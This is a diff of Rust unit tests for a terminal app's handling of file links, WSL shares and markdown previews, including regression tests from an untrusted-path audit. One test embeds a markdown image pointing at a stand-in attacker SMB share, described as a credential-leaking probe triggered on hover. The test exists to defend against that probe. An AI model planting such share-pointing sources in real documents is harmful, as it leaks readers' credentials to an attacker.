-            hyperlink_activation(true, true, "file:///C:/Users/me/notes.md", &no_directories),
+            hyperlink_activation(
+                true,
+                true,
+                "file:///C:/Users/me/notes.md",
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &no_directories
+            ),
             HyperlinkActivation::External(PathBuf::from(r"C:\Users\me\notes.md")),
             "and Ctrl hands that same file to the system instead"
         );
@@ -109330,28 +109685,45 @@ mod tests {
                 false,
                 true,
                 "file:///D:/%E4%B8%AD%E6%96%87/note.md",
+                bt_transcript::paths::PathNamer::ThisWindow,
                 &no_directories
             ),
             HyperlinkActivation::Preview(PathBuf::from(r"D:\中文\note.md"), None),
             "and it is the decoded path that travels, not the URI"
         );
         assert_eq!(
-            hyperlink_activation(true, true, "file:///C:/repo/docs", &|path| path
-                == Path::new(r"C:\repo\docs")),
+            hyperlink_activation(
+                true,
+                true,
+                "file:///C:/repo/docs",
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &|path| path == Path::new(r"C:\repo\docs")
+            ),
             HyperlinkActivation::Reveal(PathBuf::from(r"C:\repo\docs")),
             "a folder is Explorer's"
         );
         assert_eq!(
-            hyperlink_activation(false, true, "file:///C:/repo/docs", &|path| path
-                == Path::new(r"C:\repo\docs")),
+            hyperlink_activation(
+                false,
+                true,
+                "file:///C:/repo/docs",
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &|path| path == Path::new(r"C:\repo\docs")
+            ),
             HyperlinkActivation::FilesColumn(PathBuf::from(r"C:\repo\docs")),
             "and a plain click opens no Explorer window: it points this window's own column at it"
         );
         for control in [false, true] {
             assert_eq!(
-                hyperlink_activation(control, true, "file://server/share/notes.md", &|_| {
-                    panic!("a share must not be probed: §7.1.3 does not read one unasked")
-                }),
+                hyperlink_activation(
+                    control,
+                    true,
+                    "file://server/share/notes.md",
+                    bt_transcript::paths::PathNamer::ThisWindow,
+                    &|_| {
+                        panic!("a share must not be probed: §7.1.3 does not read one unasked")
+                    }
+                ),
                 HyperlinkActivation::Preview(PathBuf::from(r"\\server\share\notes.md"), None),
                 "a share meets the network card under either modifier, without a round trip"
             );
@@ -109365,12 +109737,24 @@ mod tests {
         let hosts_uri = bt_transcript::paths::local_path_to_file_uri(&hosts);
         assert_eq!(hosts_uri, "file://wsl.localhost/Ubuntu/etc/hosts");
         assert_eq!(
-            hyperlink_activation(false, true, &hosts_uri, &no_directories),
+            hyperlink_activation(
+                false,
+                true,
+                &hosts_uri,
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &no_directories
+            ),
             HyperlinkActivation::Preview(hosts.clone(), None),
             "a distribution-internal path opens in this window, through the share Windows serves it at"
         );
         assert_eq!(
-            hyperlink_activation(true, true, &hosts_uri, &no_directories),
+            hyperlink_activation(
+                true,
+                true,
+                &hosts_uri,
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &no_directories
+            ),
             HyperlinkActivation::External(hosts),
             "and `Ctrl` hands it over exactly as it hands over a drive-rooted file"
         );
@@ -109381,16 +109765,93 @@ mod tests {
             "vscode://file/C:/x",
         ] {
             assert_eq!(
-                hyperlink_activation(true, true, uri, &no_directories),
+                hyperlink_activation(
+                    true,
+                    true,
+                    uri,
+                    bt_transcript::paths::PathNamer::ThisWindow,
+                    &no_directories
+                ),
                 HyperlinkActivation::Blocked,
                 "an unknown scheme is inert, and says so when asked: {uri:?}"
             );
             assert_eq!(
-                hyperlink_activation(false, true, uri, &no_directories),
+                hyperlink_activation(
+                    false,
+                    true,
+                    uri,
+                    bt_transcript::paths::PathNamer::ThisWindow,
+                    &no_directories
+                ),
                 HyperlinkActivation::None,
                 "and says nothing at all when it was not: {uri:?}"
             );
         }
+    }
+
+    /// RED — **a distribution's share is the pane's to name, and only its own pane's** (route D of
+    /// the untrusted-path audit, 2026-09-08).
+    ///
+    /// RED EVIDENCE (2026-09-08). §7.30 gave a WSL pane's `/etc/hosts` a road into this window
+    /// through `\\wsl.localhost\<distro>\…`, and the gate that let it through read the path's
+    /// prefix and nothing else — so `file://wsl.localhost/Ubuntu/etc/hosts` declared over `OSC 8`
+    /// by any program in any pane went down the same road. What that costs is not hypothetical:
+    /// the arm below the gate calls `is_dir` on the window thread, and reaching into a
+    /// distribution that is not running starts a virtual machine while the window is holding
+    /// still. Before the fix, in a PowerShell pane:
+    ///
+    /// ```text
+    /// a share a PowerShell pane names is not that pane's to name
+    ///   left: External("\\\\wsl.localhost\\Ubuntu\\etc\\hosts")
+    ///  right: Preview("\\\\wsl.localhost\\Ubuntu\\etc\\hosts", None)
+    /// ```
+    ///
+    /// The `Preview` arm is the refusal card §7.1.3 already draws for a share, which is what a
+    /// pane that cannot name this place owes a reader: the reference is still there, the card
+    /// still says why nothing is shown, and nothing is opened.
+    ///
+    /// MUTATION: ignore the namer in `may_read_unasked` and the first two assertions go red — one
+    /// pane's link is every pane's again.
+    #[test]
+    fn a_distribution_share_is_named_only_by_the_pane_standing_in_it() {
+        let hosts = PathBuf::from(r"\\wsl.localhost\Ubuntu\etc\hosts");
+        let uri = bt_transcript::paths::local_path_to_file_uri(&hosts);
+        let windows = bt_transcript::paths::PrintedPathNamespace::Windows;
+        let ubuntu = bt_transcript::paths::PrintedPathNamespace::Wsl {
+            distro: Some("Ubuntu".to_owned()),
+            home: None,
+        };
+        let debian = bt_transcript::paths::PrintedPathNamespace::Wsl {
+            distro: Some("Debian".to_owned()),
+            home: None,
+        };
+        for (namespace, what) in [
+            (&windows, "a PowerShell pane"),
+            (&debian, "a pane standing in another distribution"),
+        ] {
+            assert_eq!(
+                hyperlink_activation(
+                    true,
+                    true,
+                    &uri,
+                    bt_transcript::paths::PathNamer::Pane(namespace),
+                    &|_| panic!("the disk is not asked about a place this pane cannot name"),
+                ),
+                HyperlinkActivation::Preview(hosts.clone(), None),
+                "a share {what} names is not that pane's to name",
+            );
+        }
+        assert_eq!(
+            hyperlink_activation(
+                true,
+                true,
+                &uri,
+                bt_transcript::paths::PathNamer::Pane(&ubuntu),
+                &no_directories,
+            ),
+            HyperlinkActivation::External(hosts),
+            "and the pane standing in Ubuntu opens Ubuntu's own files exactly as before",
+        );
     }
 
     /// PIN — **a printed `file:` link to a local page never opens its source**
@@ -109437,7 +109898,13 @@ mod tests {
             ),
         ] {
             assert_eq!(
-                hyperlink_activation(false, true, uri, &no_directories),
+                hyperlink_activation(
+                    false,
+                    true,
+                    uri,
+                    bt_transcript::paths::PathNamer::ThisWindow,
+                    &no_directories
+                ),
                 HyperlinkActivation::Preview(PathBuf::from(path), None),
                 "a plain click opens the page in this window: {uri:?}"
             );
@@ -109450,7 +109917,13 @@ mod tests {
             );
             assert!(
                 matches!(
-                    hyperlink_activation(true, true, uri, &no_directories),
+                    hyperlink_activation(
+                        true,
+                        true,
+                        uri,
+                        bt_transcript::paths::PathNamer::ThisWindow,
+                        &no_directories
+                    ),
                     HyperlinkActivation::External(_)
                 ),
                 "and Ctrl still hands the page to this machine: {uri:?}"
@@ -109461,6 +109934,7 @@ mod tests {
                 true,
                 true,
                 "file:///C:/Program%20Files/report.html",
+                bt_transcript::paths::PathNamer::ThisWindow,
                 &no_directories
             ),
             HyperlinkActivation::External(PathBuf::from(r"C:\Program Files\report.html")),
@@ -109478,7 +109952,13 @@ mod tests {
             ("file:///C:/site/html", r"C:\site\html"),
         ] {
             assert_eq!(
-                hyperlink_activation(false, true, uri, &no_directories),
+                hyperlink_activation(
+                    false,
+                    true,
+                    uri,
+                    bt_transcript::paths::PathNamer::ThisWindow,
+                    &no_directories
+                ),
                 HyperlinkActivation::Preview(PathBuf::from(path), None),
                 "not a page, so a plain click is still the preview seat's: {uri:?}"
             );
@@ -109492,16 +109972,27 @@ mod tests {
             );
         }
         assert_eq!(
-            hyperlink_activation(true, true, "file:///C:/sites/archive.html", &|path| path
-                == Path::new(r"C:\sites\archive.html")),
+            hyperlink_activation(
+                true,
+                true,
+                "file:///C:/sites/archive.html",
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &|path| path == Path::new(r"C:\sites\archive.html")
+            ),
             HyperlinkActivation::Reveal(PathBuf::from(r"C:\sites\archive.html")),
             "a folder is Explorer's however it is named"
         );
         for control in [false, true] {
             assert_eq!(
-                hyperlink_activation(control, true, "file://server/share/index.html", &|_| {
-                    panic!("a share must not be probed: §7.1.3 does not read one unasked")
-                }),
+                hyperlink_activation(
+                    control,
+                    true,
+                    "file://server/share/index.html",
+                    bt_transcript::paths::PathNamer::ThisWindow,
+                    &|_| {
+                        panic!("a share must not be probed: §7.1.3 does not read one unasked")
+                    }
+                ),
                 HyperlinkActivation::Preview(PathBuf::from(r"\\server\share\index.html"), None),
                 "a share meets the network card it always met, without a round trip"
             );
@@ -109691,7 +110182,13 @@ mod tests {
             "file:///C:/100%/x.md",
         ] {
             assert_eq!(
-                hyperlink_activation(true, true, uri, &no_directories),
+                hyperlink_activation(
+                    true,
+                    true,
+                    uri,
+                    bt_transcript::paths::PathNamer::ThisWindow,
+                    &no_directories
+                ),
                 HyperlinkActivation::Blocked,
                 "{uri:?}"
             );
@@ -109709,8 +110206,16 @@ mod tests {
         assert!(hover.observe(Some(link.clone()), start));
         assert_eq!(hover.underline_target(), Some(&link));
         assert!(hover.active.is_none(), "tooltip must not appear instantly");
-        assert!(!hover.activate_if_due(start + Duration::from_millis(299), &no_directories));
-        assert!(hover.activate_if_due(start + Duration::from_millis(300), &no_directories));
+        assert!(!hover.activate_if_due(
+            start + Duration::from_millis(299),
+            bt_transcript::paths::PathNamer::ThisWindow,
+            &no_directories
+        ));
+        assert!(hover.activate_if_due(
+            start + Duration::from_millis(300),
+            bt_transcript::paths::PathNamer::ThisWindow,
+            &no_directories
+        ));
         assert_eq!(
             hover.status_text(80).as_deref(),
             Some("file:///actual-target")
@@ -109761,9 +110266,11 @@ mod tests {
             let start = Instant::now();
             let mut hover = HyperlinkHover::default();
             hover.observe(Some(hyperlink_hit(uri)), start);
-            assert!(
-                hover.activate_if_due(start + Duration::from_millis(300), &|_: &Path| directory)
-            );
+            assert!(hover.activate_if_due(
+                start + Duration::from_millis(300),
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &|_: &Path| directory
+            ));
             hover
         }
 
@@ -109825,9 +110332,11 @@ mod tests {
             let start = Instant::now();
             let mut hover = HyperlinkHover::default();
             hover.observe(Some(hyperlink_hit(uri)), start);
-            assert!(
-                hover.activate_if_due(start + Duration::from_millis(300), &|_: &Path| directory)
-            );
+            assert!(hover.activate_if_due(
+                start + Duration::from_millis(300),
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &|_: &Path| directory
+            ));
             hover
         }
         let cells = |line: &str| bt_unicode::text_width(line);
@@ -110348,13 +110857,25 @@ mod tests {
                 named.display()
             );
             assert_eq!(
-                hyperlink_activation(false, true, &hit.uri, &is_directory),
+                hyperlink_activation(
+                    false,
+                    true,
+                    &hit.uri,
+                    bt_transcript::paths::PathNamer::ThisWindow,
+                    &is_directory
+                ),
                 plain,
                 "plain click on {}",
                 named.display()
             );
             assert_eq!(
-                hyperlink_activation(true, true, &hit.uri, &is_directory),
+                hyperlink_activation(
+                    true,
+                    true,
+                    &hit.uri,
+                    bt_transcript::paths::PathNamer::ThisWindow,
+                    &is_directory
+                ),
                 control,
                 "Ctrl+click on {}",
                 named.display()
@@ -110442,7 +110963,13 @@ mod tests {
 
         let is_directory = |path: &Path| path.is_dir();
         assert_eq!(
-            hyperlink_activation(false, true, &hit.uri, &is_directory),
+            hyperlink_activation(
+                false,
+                true,
+                &hit.uri,
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &is_directory
+            ),
             HyperlinkActivation::Preview(
                 readable.clone(),
                 Some(bt_transcript::paths::PrintedPathLocation {
@@ -110453,7 +110980,13 @@ mod tests {
             "plainly, the preview seat — told where to look"
         );
         assert_eq!(
-            hyperlink_activation(true, true, &hit.uri, &is_directory),
+            hyperlink_activation(
+                true,
+                true,
+                &hit.uri,
+                bt_transcript::paths::PathNamer::ThisWindow,
+                &is_directory
+            ),
             HyperlinkActivation::External(readable.clone()),
             "and the system's handler takes the file it always took"
         );
@@ -110531,7 +111064,13 @@ mod tests {
             HyperlinkActivation::Preview(PathBuf::from(r"C:\notes\phd application.md"), None);
         for hit in [&head, &tail] {
             assert_eq!(
-                hyperlink_activation(false, true, &hit.uri, &|_| false),
+                hyperlink_activation(
+                    false,
+                    true,
+                    &hit.uri,
+                    bt_transcript::paths::PathNamer::ThisWindow,
+                    &|_| false
+                ),
                 opened,
                 "either segment opens the one file the run names"
             );
@@ -121499,15 +122038,30 @@ mod tests {
         ] {
             for (control, expected) in [(false, plainly), (true, under_control)] {
                 assert_eq!(
-                    terminal_link_answers_a_press(control, Some(uri), is_directory),
+                    terminal_link_answers_a_press(
+                        control,
+                        Some(uri),
+                        bt_transcript::paths::PathNamer::ThisWindow,
+                        is_directory
+                    ),
                     expected,
                     "the hand over {uri:?} with Ctrl {control}"
                 );
                 // One expression, not two agreeing ones.
                 assert_eq!(
-                    terminal_link_answers_a_press(control, Some(uri), is_directory),
-                    hyperlink_activation(control, true, uri, is_directory)
-                        != HyperlinkActivation::None,
+                    terminal_link_answers_a_press(
+                        control,
+                        Some(uri),
+                        bt_transcript::paths::PathNamer::ThisWindow,
+                        is_directory
+                    ),
+                    hyperlink_activation(
+                        control,
+                        true,
+                        uri,
+                        bt_transcript::paths::PathNamer::ThisWindow,
+                        is_directory
+                    ) != HyperlinkActivation::None,
                     "the shape and the verb are the same reading: {uri:?}, Ctrl {control}"
                 );
                 assert_eq!(
@@ -121515,7 +122069,12 @@ mod tests {
                         false,
                         None,
                         None,
-                        terminal_link_answers_a_press(control, Some(uri), is_directory),
+                        terminal_link_answers_a_press(
+                            control,
+                            Some(uri),
+                            bt_transcript::paths::PathNamer::ThisWindow,
+                            is_directory
+                        ),
                         false,
                         None
                     ),
@@ -121530,7 +122089,12 @@ mod tests {
         }
         // No link under the pointer is no hand, whatever is held down.
         for control in [false, true] {
-            assert!(!terminal_link_answers_a_press(control, None, is_directory));
+            assert!(!terminal_link_answers_a_press(
+                control,
+                None,
+                bt_transcript::paths::PathNamer::ThisWindow,
+                is_directory
+            ));
         }
     }
 
@@ -124399,6 +124963,65 @@ mod tests {
         assert!(
             pictures.settle_deadline.is_none(),
             "and therefore no wake-up asked for either"
+        );
+    }
+
+    /// RED — **a document's own text does not send this window to a share** (route E of the
+    /// untrusted-path audit, 2026-09-08).
+    ///
+    /// RED EVIDENCE (2026-09-08). A markdown page is rendered on a *hover*, and rendering it walks
+    /// every image block and asks for that source's pixels. `link_action` resolved a source into
+    /// `LinkAction::Preview` on the strength of it being absolute and nothing else, and
+    /// `request_peek_pixels` asked nothing at all — so `![](\\attacker\share\x.png)` written into
+    /// any `.md` a reader rests a pointer on was an SMB probe, with the user's credentials, and no
+    /// click anywhere in it. Before the fix:
+    ///
+    /// ```text
+    /// a source this window may not read is a source it never asks for
+    ///   left: ["\\\\attacker\\share\\probe.png"]  right: []
+    /// ```
+    ///
+    /// `ask` is `WindowRuntime::resolve_document_pictures`'s closure over `request_peek_pixels`,
+    /// so "never asked for" is exactly "this closure is not called" — the same seam route A's own
+    /// test reads one layer up, at the body the card chooses.
+    ///
+    /// The local sibling in the same document is the control: nothing about an ordinary page
+    /// changes, and the refused source draws what a picture this window cannot read draws.
+    ///
+    /// MUTATION: drop the gate from `resolved_link` and the share is asked for again.
+    #[test]
+    fn a_share_named_by_a_document_is_never_asked_for() {
+        let blocks = preview::parse_markdown(
+            "![a probe](\\\\attacker\\share\\probe.png)\n\n![a shot](shots/one.png)\n",
+        );
+        let mut asked: Vec<PathBuf> = Vec::new();
+        let pictures = resolve_document_pictures(
+            &blocks,
+            Some(Path::new(r"D:\proj\README.md")),
+            bt_render::Theme::Dark,
+            &mut |path, _| {
+                asked.push(path.to_path_buf());
+                MarkdownPicture::Loading
+            },
+        );
+        assert_eq!(
+            asked,
+            vec![PathBuf::from(r"D:\proj\shots/one.png")],
+            "a source this window may not read is a source it never asks for",
+        );
+        assert!(
+            matches!(
+                pictures.by_source.get("\\\\attacker\\share\\probe.png"),
+                Some(MarkdownPicture::Failed)
+            ),
+            "and it draws what a picture this window cannot read draws: {:?}",
+            pictures.by_source,
+        );
+        assert!(
+            !pictures
+                .files
+                .contains(Path::new(r"\\attacker\share\probe.png")),
+            "nor is the watch told to follow it",
         );
     }
 
